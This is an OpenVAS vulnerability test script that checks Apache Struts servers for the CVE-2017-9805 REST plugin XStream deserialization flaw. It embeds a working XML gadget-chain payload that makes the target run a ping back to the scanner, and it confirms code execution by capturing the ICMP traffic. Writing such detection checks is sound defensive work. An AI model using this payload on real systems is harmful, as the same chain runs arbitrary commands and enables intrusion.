###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811730");
  script_version("$Revision: 13994 $");
  script_cve_id("CVE-2017-9805");
  script_bugtraq_id(100609);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
  script_name("Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://struts.apache.org/docs/s2-052.html");

  script_tag(name:"summary", value:"This host is running Apache Struts and is
  prone to remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check
  whether we are able to execute arbitrary code or not.");

  script_tag(name:"insight", value:"The flaw exists within the REST plugin which
  is using a XStreamHandler with an instance of XStream for deserialization
  without any type filtering.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow
  an attacker to execute arbitrary code in the context of the affected application.
  Failed exploit attempts will likely result in denial-of-service conditions.");

  script_tag(name:"affected", value:"Apache Struts versions 2.5 through 2.5.12,
  2.1.2 through 2.3.33.");

  script_tag(name:"solution", value:"Upgrade to Apache Struts version 2.5.13
  or 2.3.34 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://struts.apache.org");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("host_details.inc");

port = get_http_port(default:8080);
host = http_host_name(dont_add_port:TRUE);

foreach ext(make_list("action", "do", "jsp")){
  exts = http_get_kb_file_extensions(port:port, host:host, ext:ext);
  if(exts && is_array(exts)){
    found = TRUE;
    break;
  }
}

if( ! found )
  exit( 0 );

host = http_host_name(port:port);
soc = open_sock_tcp(port);
if(!soc)
  exit(0);

if(host_runs("Windows") == "yes"){
  COMMAND = '<string>ping</string><string>-n</string><string>3</string><string>' + this_host() + '</string>';
  win = TRUE;
}else{
  ##For Linux and Unix platform
  vtstrings = get_vt_strings();
  check = vtstring["ping_string"];
  pattern = hexstr(check);
  COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>' + this_host() + '</string>';
}

data =
'				<map>
				<entry>
				<jdk.nashorn.internal.objects.NativeString>
				<flags>0</flags>
				<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
				<dataHandler>
				<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
				<is class="javax.crypto.CipherInputStream">
				<cipher class="javax.crypto.NullCipher">
				<initialized>false</initialized>
				<opmode>0</opmode>
				<serviceIterator class="javax.imageio.spi.FilterIterator">
				<iter class="javax.imageio.spi.FilterIterator">
				<iter class="java.util.Collections$EmptyIterator"/>
				<next class="java.lang.ProcessBuilder">
				<command>
				' + COMMAND + '
				</command>
				<redirectErrorStream>false</redirectErrorStream>
				</next>
				</iter>
				<filter class="javax.imageio.ImageIO$ContainsFilter">
				<method>
				<class>java.lang.ProcessBuilder</class>
				<name>start</name>
				<parameter-types/>
				</method>
				<name>foo</name>
				</filter>
				<next class="string">foo</next>
				</serviceIterator>
				<lock/>
				</cipher>
				<input class="java.lang.ProcessBuilder$NullInputStream"/>
				<ibuffer/>
				<done>false</done>
				<ostart>0</ostart>
				<ofinish>0</ofinish>
				<closed>false</closed>
				</is>
				<consumed>false</consumed>
				</dataSource>
				<transferFlavors/>
				</dataHandler>
				<dataLen>0</dataLen>
				</value>
				</jdk.nashorn.internal.objects.NativeString>
				<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				<entry>
				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				</map>';
len = strlen(data);
url = '/struts2-rest-showcase/orders/3';
req = http_post_req( port: port,
                     url: url,
                     data: data,
                     add_headers: make_array( 'Content-Type', 'application/xml'));

res = send_capture( socket:soc,
                    data:req,
                    timeout:2,
                    pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
close(soc);

if(res && (win || check >< res)){
  report = "It was possible to execute command remotely at " + report_vuln_url( port:port, url:url, url_only:TRUE ) + " with the command '" + COMMAND + "'.";
  security_message(port:port, data:report);
  exit(0);
}

exit(99);